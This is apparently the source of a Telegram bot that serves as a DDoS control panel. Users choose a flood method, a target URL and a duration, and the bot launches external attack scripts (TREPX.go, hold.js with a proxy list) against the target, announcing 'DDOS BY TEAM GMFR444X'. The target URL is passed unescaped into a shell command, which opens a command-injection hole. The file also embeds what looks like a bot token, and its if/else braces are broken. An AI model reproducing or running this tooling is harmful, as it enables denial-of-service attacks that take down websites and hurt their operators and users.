const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');

const botTokenFileContent = fs.readFileSync('bot_token.txt', 'utf-8');
const botTokenMatch = botTokenFileContent.match(/BotToken\s*=\s*'(.*)'/);

if (!botTokenMatch || !botTokenMatch[1]) {
  console.error('Invalid format in bot_token.txt. Please use: BotToken = \'7178790594:AAH1eHc7vDezwixR1F2rmd-vqiCkLvfgv1s\'');
  process.exit(1);
}

const botToken = botTokenMatch[1];
const bot = new TelegramBot(botToken, { polling: true });

const pendingCommands = {};

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  if (messageText === '/start') {
    bot.sendMessage(chatId, 'Bot started. Use /run to execute a command.');
  } else if (messageText === '/run') {
    const keyboard = {
      reply_markup: {
        keyboard: [
          ['HOLD', 'HOLD1'],
        ],
        one_time_keyboard: true,
      },
    };
    bot.sendMessage(chatId, 'Choose method:', keyboard);
    pendingCommands[chatId] = { step: 'method' };
  } else if (['HOLD', 'HOLD1'].includes(messageText) && pendingCommands[chatId]?.step === 'method') {
    const method = messageText.toUpperCase();
    pendingCommands[chatId] = { step: 'url', method };
    bot.sendMessage(chatId, 'Enter URL:');
  } else if (pendingCommands[chatId]?.step === 'url') {
    const url = messageText;
    pendingCommands[chatId] = { step: 'time', method: pendingCommands[chatId].method, url };

    const keyboard = {
      reply_markup: {
        keyboard: [
          ['UNTUK ANTISIPASI PANEL ANDA GUNAKAN TIME DIBAWAH INI'],
          ['60', '1000'],
        ],
        one_time_keyboard: true,
      },
    };
    bot.sendMessage(chatId, 'Choose time (in seconds):', keyboard);
  } else if (pendingCommands[chatId]?.step === 'time' && ['60'].includes(messageText)) {
    const { method, url } = pendingCommands[chatId];
    const time = messageText;

    const initialResponseMessage = `DDOS BY TEAM GMFR444X \nTarget: ${url}\nTime: ${time}\nMethod: ${method}\nStatus: START`;
    bot.sendMessage(chatId, initialResponseMessage);

    let command;

    if (method === 'HOLD') {
      command = `go run TREPX.go -url ${url}`;
    else if (method === 'HOLD1') {
      command = `node hold.js ${url} ${time} 64 10 proxy.txt`;
    }
    }

    exec(command, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }

      if (stderr) {
        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }

      const completionResponseMessage = `Target: ${url}\nTime: ${time}\nMethod: ${method}\nStatus: COMPLETED\n${stdout}`;
      bot.sendMessage(chatId, completionResponseMessage);
    });

    delete pendingCommands[chatId];
  } else {
    bot.sendMessage(chatId, 'Incorrect command format. Use /run or /start');
    delete pendingCommands[chatId];
  }
});